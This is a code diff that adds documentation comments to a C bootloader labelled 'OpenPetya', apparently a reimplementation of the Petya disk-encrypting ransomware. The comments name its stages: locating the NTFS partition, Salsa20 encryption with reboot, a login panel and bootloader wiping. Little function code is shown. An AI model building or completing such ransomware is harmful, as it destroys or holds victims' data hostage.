@@ -107,6 +107,9 @@ static void get_cpu_vendor(char *out) {
     out[12] = '\0';
 }
 
+/// @brief Search the first NTFS LBA
+/// @param  
+/// @return 
 static uint32_t find_ntfs_partition_lba(void)
 {
     uint8_t mbr[512];
@@ -131,10 +134,8 @@ static uint32_t find_ntfs_partition_lba(void)
     {
         uint8_t *entry = mbr + 0x1BE + i * 16;
         uint8_t  type  = entry[4];
-        uint32_t lba   = entry[8]  | ((uint32_t)entry[9]  << 8)
-                       | ((uint32_t)entry[10] << 16) | ((uint32_t)entry[11] << 24);
-        uint32_t size  = entry[12] | ((uint32_t)entry[13] << 8)
-                       | ((uint32_t)entry[14] << 16) | ((uint32_t)entry[15] << 24);
+        uint32_t lba   = entry[8]  | ((uint32_t)entry[9]  << 8) | ((uint32_t)entry[10] << 16) | ((uint32_t)entry[11] << 24);
+        uint32_t size  = entry[12] | ((uint32_t)entry[13] << 8) | ((uint32_t)entry[14] << 16) | ((uint32_t)entry[15] << 24);
 
         if (type != 0x07)   // 0x07 = NTFS/exFAT
             continue;
@@ -301,11 +302,15 @@ void vga_draw_centered_ascii(const char *art)
     }
 }
 
+/// @brief Set VGA display color
+/// @param color 
 void vga_set_color(uint8_t color)
 {
     current_color = color;
 }
 
+/// @brief Print integer in decimal representation
+/// @param n 
 void vga_put_dec(uint32_t n)
 {
     char buf[16];
@@ -313,6 +318,8 @@ void vga_put_dec(uint32_t n)
     vga_puts(buf);
 }
 
+/// @brief Print integer in hexadecimal representation
+/// @param n Integer value
 void vga_put_hex(uint32_t n)
 {
     char buf[16];
@@ -321,6 +328,8 @@ void vga_put_hex(uint32_t n)
     vga_puts(buf);
 }
 
+/// @brief Clear OpenPetya meta from disk.
+/// @param  
 void wipe_out_bootloader(void)
 {
     uint8_t zero[512] = { 0 };
@@ -338,6 +347,8 @@ void wipe_out_bootloader(void)
     vga_puts("Done.\n");
 }
 
+/// @brief Do Salsa20 encryption and reboot
+/// @param  
 void do_encryption(void)
 {
     vga_clear();
@@ -450,6 +461,8 @@ halt:
     __builtin_unreachable();
 }
 
+/// @brief Login panel
+/// @param  
 void login(void)
 {
     vga_clear();
@@ -580,6 +593,8 @@ halt:
     __builtin_unreachable();
 }
 
+/// @brief Main function of OpenPetya bootloader
+/// @param boot_drive 
 void bootloader_main(uint32_t boot_drive)
 {
     vga_clear();
